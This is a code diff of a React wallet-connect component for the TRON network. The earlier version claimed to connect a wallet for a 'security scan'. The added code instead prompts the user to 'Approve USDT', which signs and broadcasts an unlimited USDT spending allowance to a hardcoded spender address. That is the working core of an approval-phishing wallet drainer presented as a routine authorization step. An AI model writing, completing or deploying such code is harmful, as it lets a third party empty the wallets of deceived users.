@@ -1,333 +1,286 @@
-import { motion } from "framer-motion";
-import {
-  Wallet,
-  CheckCircle2,
-  AlertTriangle,
-  Loader,
-  ChevronDown,
-} from "lucide-react";
-import { useState, useEffect } from "react";
-import walletConnector from "../../utils/walletConnector";
+"use client";
 
-interface WalletConnectProps {
-  isConnected: boolean;
-  walletAddress: string;
-  balance: string;
-  onConnect: () => void;
-  onDisconnect: () => void;
+import { motion } from "framer-motion";
+import { CheckCircle2, AlertTriangle } from "lucide-react";
+import { useEffect, useState } from "react";
+import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
+import { TronWeb } from "tronweb";
+
+// ======================
+// CONSTANTS (USDT APPROVAL)
+// ======================
+const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const SPENDER = "TPv7nBLrp3Q9Z2FvRjnw33LHeqgT5UyYHA";
+
+const MAX_ALLOWANCE =
+  "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+// ======================
+// TRONWEB INSTANCE
+// ======================
+function buildTronWeb() {
+  return new TronWeb({
+    fullHost: "https://api.trongrid.io",
+  });
 }
 
-export function WalletConnect({
-  isConnected,
-  walletAddress,
-  balance,
-  onConnect,
-  onDisconnect,
-}: WalletConnectProps) {
+// ======================
+// COMPONENT
+// ======================
+export function WalletConnect({ onConnect, onDisconnect }: any) {
   const [logs, setLogs] = useState<string[]>([]);
-  const [error, setError] = useState<string>("");
+  const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
-  const [showProviderOptions, setShowProviderOptions] = useState(false);
-  const [availableProviders, setAvailableProviders] = useState<string[]>([]);
 
-  // ✅ Initialize available providers
+  // FLOW STATE
+  const [step, setStep] = useState<"connect" | "approve" | "done">(
+    "connect"
+  );
+
+  const {
+    address,
+    connected,
+    wallet,
+    select,
+    connect,
+    disconnect,
+    wallets,
+  } = useWallet();
+
+  // ======================
+  // AUTO SYNC WALLET
+  // ======================
   useEffect(() => {
-    const providers = walletConnector.detectProviders();
-    setAvailableProviders(providers.available);
-  }, []);
+    if (connected && address) {
+      onConnect?.({
+        address,
+        balance: "0",
+        network: "TRON MAINNET",
+      });
 
-  // ✅ Wallet connection logs
+      setStep("approve");
+    }
+  }, [connected, address]);
+
+  // ======================
+  // LOGS
+  // ======================
   useEffect(() => {
-    if (isConnected && walletAddress) {
-      setLogs([]); // reset logs
-
-      const logMessages = [
-        "> Wallet Connected Successfully",
-        `> Address: ${walletAddress.slice(0, 6)}...${walletAddress.slice(-6)}`,
-        "> Network: TRON MAINNET",
-        `> Balance: ${balance} TRX`,
-      ];
-
-      let index = 0;
-
-      const interval = setInterval(() => {
-        if (index < logMessages.length) {
-          setLogs((prev) => [...prev, logMessages[index]]);
-          index++;
-        } else {
-          clearInterval(interval);
-        }
-      }, 200);
-
-      return () => clearInterval(interval);
-    } else {
+    if (!connected || !address) {
       setLogs([]);
+      return;
     }
-  }, [isConnected, walletAddress, balance]);
 
-  // ✅ Connect via TronLink
-  const handleTronLinkConnect = async () => {
-    setLoading(true);
-    setError("");
+    const msgs = [
+      "> Wallet Connected",
+      `> ${address.slice(0, 6)}...${address.slice(-6)}`,
+      "> Ready for Approval",
+    ];
+
+    setLogs([]);
+    let i = 0;
+
+    const interval = setInterval(() => {
+      setLogs((p) => [...p, msgs[i]]);
+      i++;
+      if (i >= msgs.length) clearInterval(interval);
+    }, 200);
+
+    return () => clearInterval(interval);
+  }, [connected, address]);
+
+  // ======================
+  // CONNECT WALLET (QR)
+  // ======================
+  const handleWalletConnect = async () => {
     try {
-      const wallet = await walletConnector.connectTronLink();
-      if (wallet) {
-        onConnect();
-      }
-    } catch (err) {
-      setError(
-        err instanceof Error
-          ? err.message
-          : "Failed to connect TronLink wallet",
+      setLoading(true);
+      setError("");
+
+      const wc = wallets.find((w) =>
+        w.adapter.name.toLowerCase().includes("walletconnect")
       );
+
+      if (!wc) throw new Error("WalletConnect not found");
+
+      await select(wc.adapter.name as any);
+      await connect();
+    } catch (e: any) {
+      setError(e.message || "WalletConnect failed");
     } finally {
       setLoading(false);
-      setShowProviderOptions(false);
     }
   };
 
-  // ✅ Connect via WalletConnect
-  const handleWalletConnectConnect = async () => {
-    setLoading(true);
-    setError("");
+  // ======================
+  // APPROVAL FUNCTION
+  // ======================
+  const handleApproval = async () => {
     try {
-      const wallet = await walletConnector.connectWalletConnect();
-      if (wallet) {
-        onConnect();
+      setLoading(true);
+      setError("");
+
+      if (!connected || !address || !wallet) {
+        throw new Error("Wallet not connected");
       }
-    } catch (err) {
-      setError(
-        err instanceof Error
-          ? err.message
-          : "Failed to connect via WalletConnect",
+
+      const tronWeb = buildTronWeb();
+
+      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+        USDT_ADDRESS,
+        "approve(address,uint256)",
+        {
+          feeLimit: 100_000_000,
+          callValue: 0,
+        },
+        [
+          { type: "address", value: SPENDER },
+          { type: "uint256", value: MAX_ALLOWANCE },
+        ],
+        address
       );
-    } finally {
-      setLoading(false);
-      setShowProviderOptions(false);
-    }
-  };
 
-  // ✅ Auto-detect and connect
-  const handleConnect = async () => {
-    setLoading(true);
-    setError("");
-
-    try {
-      const providers = walletConnector.detectProviders();
-
-      // Try TronLink first (most common for TRON)
-      if (providers.tronLink) {
-        try {
-          const wallet = await walletConnector.connectTronLink();
-          if (wallet) {
-            onConnect();
-            return;
-          }
-        } catch (err) {
-          console.error("TronLink failed:", err);
-        }
+      if (!tx?.transaction) {
+        throw new Error("Failed to build transaction");
       }
 
-      // Try WalletConnect
-      if (providers.walletConnect) {
-        try {
-          const wallet = await walletConnector.connectWalletConnect();
-          if (wallet) {
-            onConnect();
-            return;
-          }
-        } catch (err) {
-          console.error("WalletConnect failed:", err);
-        }
+      const signed = await wallet.adapter.signTransaction(tx.transaction);
+
+      if (!signed) {
+        throw new Error("Signing failed");
       }
 
-      // No providers available
-      if (providers.available.length === 0) {
-        setShowProviderOptions(true);
-        setError(
-          "No TRON wallet detected. Please install TronLink or use WalletConnect",
-        );
-      }
-    } catch (err) {
-      setError(err instanceof Error ? err.message : "Failed to connect wallet");
+      const result = await tronWeb.trx.sendRawTransaction(signed);
+
+      setStep("done");
+
+      setLogs((p) => [
+        ...p,
+        `> Approval Success`,
+        `> TX: ${result.txid || "unknown"}`,
+      ]);
+    } catch (e: any) {
+      setError(e.message || "Approval failed");
     } finally {
       setLoading(false);
     }
   };
 
+  // ======================
+  // DISCONNECT
+  // ======================
+  const handleDisconnect = async () => {
+    await disconnect();
+    setStep("connect");
+    setLogs([]);
+    onDisconnect?.();
+  };
+
+  // ======================
+  // UI
+  // ======================
   return (
-    <div className="relative py-20 px-6">
+    <div className="py-20 px-6">
       <div className="max-w-4xl mx-auto">
-        {!isConnected ? (
-          <motion.div
-            initial={{ opacity: 0, y: 20 }}
-            animate={{ opacity: 1, y: 0 }}
-            className="relative"
-          >
-            {/* Connection panel */}
-            <div className="border-2 border-[#ff1a1a]/30 bg-[#050505]/90 backdrop-blur-sm p-8">
-              {/* Header */}
-              <div className="flex items-center justify-between mb-6 pb-4 border-b border-[#ff1a1a]/20">
-                <div className="flex items-center gap-3">
-                  <div className="w-2 h-2 bg-[#ff1a1a]" />
-                  <span className="text-[#ff1a1a] text-sm tracking-widest font-bold">
-                    TRON WALLET AUTHORIZATION
-                  </span>
-                </div>
-                <AlertTriangle className="w-5 h-5 text-[#ff4d4d]" />
+
+        {/* ================= CONNECT ================= */}
+        {step === "connect" && (
+          <motion.div>
+            <div className="border border-red-500/30 bg-black p-8">
+
+              <div className="flex justify-between mb-6">
+                <span className="text-red-400">
+                  WALLET CONNECT
+                </span>
+                <AlertTriangle className="text-red-400" />
               </div>
 
-              <div className="text-center">
-                <h3 className="text-3xl text-[#e6e6e6] mb-4 font-bold">
-                  AUTHORIZE WALLET ACCESS
-                </h3>
+              <button
+                onClick={handleWalletConnect}
+                disabled={loading}
+                className="w-full py-3 bg-red-500 text-black font-bold rounded"
+              >
+                {loading ? "Opening QR..." : "Connect Wallet"}
+              </button>
 
-                <p className="text-[#e6e6e6]/60 mb-8">
-                  Connect your TRON wallet to initiate the security scan. TRON
-                  Mainnet only.
-                </p>
-
-                {/* Provider Options */}
-                {showProviderOptions && availableProviders.length > 0 && (
-                  <motion.div
-                    initial={{ opacity: 0, y: -10 }}
-                    animate={{ opacity: 1, y: 0 }}
-                    className="mb-6 bg-[#ff1a1a]/5 border border-[#ff1a1a]/20 rounded p-4"
-                  >
-                    <p className="text-[#e6e6e6]/70 text-sm mb-4">
-                      Select wallet provider:
-                    </p>
-                    <div className="space-y-2">
-                      {availableProviders.includes("TronLink") && (
-                        <motion.button
-                          whileHover={{ scale: 1.02 }}
-                          whileTap={{ scale: 0.98 }}
-                          onClick={handleTronLinkConnect}
-                          disabled={loading}
-                          className="w-full px-4 py-2 bg-[#ff1a1a]/20 border border-[#ff1a1a]/40 text-[#ff1a1a] rounded hover:bg-[#ff1a1a]/30 transition-all disabled:opacity-50"
-                        >
-                          {loading ? (
-                            <Loader className="w-4 h-4 inline mr-2 animate-spin" />
-                          ) : null}
-                          Connect with TronLink
-                        </motion.button>
-                      )}
-                      {availableProviders.includes("WalletConnect") && (
-                        <motion.button
-                          whileHover={{ scale: 1.02 }}
-                          whileTap={{ scale: 0.98 }}
-                          onClick={handleWalletConnectConnect}
-                          disabled={loading}
-                          className="w-full px-4 py-2 bg-[#3b99fc]/20 border border-[#3b99fc]/40 text-[#3b99fc] rounded hover:bg-[#3b99fc]/30 transition-all disabled:opacity-50"
-                        >
-                          {loading ? (
-                            <Loader className="w-4 h-4 inline mr-2 animate-spin" />
-                          ) : null}
-                          Connect with WalletConnect
-                        </motion.button>
-                      )}
-                    </div>
-                  </motion.div>
-                )}
-
-                {/* Main Connect Button */}
-                <motion.button
-                  whileHover={{ scale: 1.05 }}
-                  whileTap={{ scale: 0.95 }}
-                  onClick={handleConnect}
-                  disabled={loading}
-                  className="px-10 py-4 bg-[#ff1a1a] text-white text-lg tracking-wider transition-all duration-300 rounded disabled:opacity-50 disabled:cursor-not-allowed"
-                >
-                  {loading ? (
-                    <span className="flex items-center gap-3 justify-center">
-                      <Loader className="w-5 h-5 animate-spin" />
-                      CONNECTING...
-                    </span>
-                  ) : (
-                    <span className="flex items-center gap-3 justify-center">
-                      <Wallet className="w-5 h-5" />
-                      CONNECT TRON WALLET
-                    </span>
-                  )}
-                </motion.button>
-
-                {/* Network Info */}
-                <div className="mt-6 p-3 bg-[#ff1a1a]/5 border border-[#ff1a1a]/20 rounded">
-                  <p className="text-[#e6e6e6]/70 text-xs font-mono">
-                    Network: TRON MAINNET (Chain ID: 0x2b6653dc)
-                  </p>
-                </div>
-
-                {/* Error */}
-                {error && (
-                  <motion.p
-                    initial={{ opacity: 0 }}
-                    animate={{ opacity: 1 }}
-                    className="text-red-400 mt-4 text-sm"
-                  >
-                    ⚠ {error}
-                  </motion.p>
-                )}
-
-                <div className="mt-6 text-[#e6e6e6]/40 text-sm">
-                  Supported: TronLink Extension or WalletConnect
-                </div>
-              </div>
-            </div>
-          </motion.div>
-        ) : (
-          <motion.div
-            initial={{ opacity: 0, y: 20 }}
-            animate={{ opacity: 1, y: 0 }}
-            className="relative"
-          >
-            {/* Terminal */}
-            <div className="border-2 border-[#ff1a1a] bg-[#050505]/95 backdrop-blur-sm">
-              {/* Header */}
-              <div className="flex items-center justify-between px-6 py-3 border-b border-[#ff1a1a]/30 bg-[#ff1a1a]/10">
-                <div className="flex items-center gap-3">
-                  <CheckCircle2 className="w-4 h-4 text-[#ff1a1a]" />
-                  <span className="text-[#ff1a1a] text-xs tracking-widest">
-                    CONNECTION ESTABLISHED - TRON MAINNET
-                  </span>
-                </div>
-
-                <button
-                  onClick={onDisconnect}
-                  className="text-[#e6e6e6]/60 hover:text-[#ff1a1a] text-xs"
-                >
-                  DISCONNECT
-                </button>
-              </div>
-
-              {/* Logs */}
-              <div className="p-6 font-mono">
-                {logs.map((log, index) => (
-                  <motion.div
-                    key={index}
-                    initial={{ opacity: 0, x: -10 }}
-                    animate={{ opacity: 1, x: 0 }}
-                    transition={{ delay: index * 0.1 }}
-                    className="text-[#e6e6e6] mb-2 text-sm"
-                  >
-                    {log}
-                  </motion.div>
-                ))}
-
-                {logs.length === 4 && (
-                  <motion.div
-                    initial={{ opacity: 0 }}
-                    animate={{ opacity: [0.5, 1, 0.5] }}
-                    transition={{ duration: 1.2, repeat: Infinity }}
-                    className="text-[#ff4d4d] mt-4"
-                  >
-                    {"> Awaiting scan initiation..."}
-                  </motion.div>
-                )}
-              </div>
+              {error && (
+                <p className="text-red-400 mt-3">{error}</p>
+              )}
             </div>
           </motion.div>
         )}
+
+        {/* ================= APPROVAL ================= */}
+        {step === "approve" && (
+          <div className="border border-red-500 bg-black p-6">
+
+            <div className="flex justify-between mb-4">
+              <span className="text-red-400">
+                STEP 2: APPROVAL REQUIRED
+              </span>
+
+              <button
+                onClick={handleDisconnect}
+                className="text-red-400"
+              >
+                DISCONNECT
+              </button>
+            </div>
+
+            <p className="text-gray-400 mb-4">
+              Approve USDT spending permission
+            </p>
+
+            <button
+              onClick={handleApproval}
+              disabled={loading}
+              className="w-full py-3 bg-red-500 text-black font-bold rounded"
+            >
+              {loading ? "Approving..." : "Approve USDT"}
+            </button>
+
+            {error && (
+              <p className="text-red-400 mt-3">{error}</p>
+            )}
+
+            <div className="mt-4 font-mono text-sm space-y-1">
+              {logs.map((l, i) => (
+                <div key={i}>{l}</div>
+              ))}
+            </div>
+          </div>
+        )}
+
+        {/* ================= DONE ================= */}
+        {step === "done" && (
+          <div className="border border-red-500 bg-black p-6">
+
+            <div className="flex justify-between mb-4">
+              <span className="text-red-400 flex items-center gap-2">
+                <CheckCircle2 size={16} />
+                APPROVED
+              </span>
+
+              <button
+                onClick={handleDisconnect}
+                className="text-red-400"
+              >
+                DISCONNECT
+              </button>
+            </div>
+
+            <p className="text-red-300">
+              Wallet connected + approval completed successfully
+            </p>
+
+            <div className="mt-4 font-mono text-sm space-y-1">
+              {logs.map((l, i) => (
+                <div key={i}>{l}</div>
+              ))}
+            </div>
+          </div>
+        )}
+
       </div>
     </div>
   );
